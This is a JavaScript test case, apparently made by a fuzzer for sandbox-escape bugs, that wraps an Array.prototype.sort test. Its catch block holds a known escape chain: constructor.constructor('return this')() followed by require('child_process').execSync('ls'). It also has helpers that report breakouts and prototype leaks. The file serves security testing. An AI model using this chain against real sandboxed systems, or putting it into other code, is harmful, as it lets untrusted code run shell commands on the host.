try {
    const array = [
        undefined,
        'c',
        ,
        'b',
        undefined,
        ,
        'a',
        'd'
    ];
    Object.defineProperty(array, '2', {
        get() {
            let REPLACER = 23;
            array.length = array.length - 2;
            return this.foo;
        },
        set(v) {
            throw () => {
                return () => {
                };
            };
            this.foo = v;
        }
    });
    array.sort();
    assert.sameValue(array[0], 'b');
    assert.sameValue(array[1], 'c');
    assert.sameValue(array[3], undefined);
    assert.sameValue(array[4], undefined);
    assert.sameValue('5' in array, false);
    assert.sameValue(array.hasOwnProperty('5'), false);
    assert.sameValue(array.length, 6);
    assert.sameValue(array.foo, undefined);
    assert.sameValue(array[2], undefined);
    assert.sameValue(array.length, 4);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}